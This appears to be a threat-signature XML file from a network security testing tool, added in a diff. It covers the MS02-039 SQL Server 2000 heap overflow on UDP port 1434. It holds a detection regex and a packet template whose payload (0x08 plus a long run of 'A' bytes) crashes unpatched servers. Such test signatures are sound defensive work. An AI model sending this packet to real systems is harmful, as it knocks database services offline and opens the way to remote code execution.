@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="MS02-039/MS02-061 MS SQL Server 2000 Heap Overflow"/>
+    <EngDesc display="true" value="MS SQL Server 2000 employs UDP Port 1434 for foreign hosts to ping for connectivity. This attack takes advantage of a heap overflow in an unpatched version of MSSQL Server, causing the service to crash.  This same flaw can be used to cause remote code execution."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+      <item value="Flood"/>
+    </Intent>
+    <Protocol display="true" value="MSSQL"/>
+    <Type_Of_Equipment display="true">
+      <item value="Database"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="SQL_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="SQL_Server_2000"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.nextgenss.com/advisories/mssql-udp.txt"/>
+    <CVEID display="true" value="CVE-2002-0649"/>
+    <bugtraqID display="true" value="5310"/>
+    <OSVDB display="true" value="4577"/>
+    <Author display="true" value="Phil Trainor"/>
+    <ID display="true" value="000000ff464eecb900a900fe009b00c9124e02f8"/>
+    <Revision display="true" value="12"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742200266093750"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X08\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X3A"/>
+    <Created value="1139461795" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="MSSQLdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+    <for index="D"/>
+    <for index="E"/>
+    <for index="F"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="" TTL="30" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="@random(1026,65535)" destPort="$MSSQLdestPort" checksum="" length="" Payload="084141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141413A"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
